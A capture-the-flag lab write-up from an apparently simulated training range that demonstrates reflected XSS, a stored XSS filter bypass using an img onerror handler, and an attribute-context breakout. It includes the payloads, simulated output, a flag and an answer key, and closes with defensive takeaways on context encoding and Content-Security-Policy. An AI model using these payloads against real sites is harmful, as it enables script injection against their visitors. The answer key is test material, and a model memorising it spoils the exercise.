# Lab 03 — Cross-Site Scripting: Filters & Bypasses

**Category:** Web / Client-side
**Environment:** TechBiz Security Academy — simulated practice range

## Objectives
- Get a payload to execute in the search field
- Bypass the tag filter on the comment field
- Break out of the attribute context in profile
- Confirm the comment payload is stored

## Methodology

### 1. Search field — reflected XSS
```
xss search <script>alert(1)</script>
```
```
[context] Value is echoed straight into the page body.
>> alert(1) fired — payload executed.
```
The payload executed immediately with no persistence — the value is echoed straight back in the response for that single request. This is **reflected** XSS.

### 2. Comment field — filter bypass, stored XSS
```
xss comment <img src=x onerror=alert(1)>
```
```
[context] <script> and </script> are stripped, nothing else is.
>> alert(1) fired — payload executed.
>> Payload stored; it runs for every visitor.
```
The filter only blacklists the literal `<script>` tag. Swapping to an `<img>` tag with an `onerror` event handler bypasses it entirely. Submitting the comment twice confirmed it persists server-side and fires for every subsequent visitor — this is **stored** XSS, a materially more dangerous class since it doesn't require tricking a victim into clicking a crafted link.

### 3. Profile field — attribute context breakout
```
xss profile "><script>alert(1)</script>
```
```
[context] Value is placed inside value="..." with no encoding.
>> alert(1) fired — payload executed.
>> Broke out of the attribute. Server returned: TBS{attribute_break_out_xss}
```
The input is reflected unencoded inside an HTML attribute (`value="..."`). The leading `">` closes the quoted attribute and the tag itself, after which the injected `<script>` executes as a sibling element.

## Answers
| Q | Question | Answer |
|---|---|---|
| q1 | Search field type | `reflected` |
| q2 | Comment field type | `stored` |
| q3 | Attribute the profile field lands inside | `value` |
| q4 | HTTP response header that best mitigates XSS | `Content-Security-Policy` |
| q5 | Flag | `TBS{attribute_break_out_xss}` |

## Takeaways
- Blacklisting specific tags (`<script>`) is trivially defeated by alternate execution vectors — event handlers on `<img>`, `<svg>`, `<body onload>`, etc.
- Context matters: encoding requirements differ for HTML body context vs. attribute context vs. JS string context. Escaping for the wrong context (or not at all) is what allows breakout.
- Stored XSS is more severe than reflected because it requires no social engineering — every visitor to the affected page is compromised.
- A strict `Content-Security-Policy` (restricting script sources, disallowing inline scripts) is the most effective single control because it works even when an injection point is missed, unlike output encoding which must be applied correctly at every single sink.
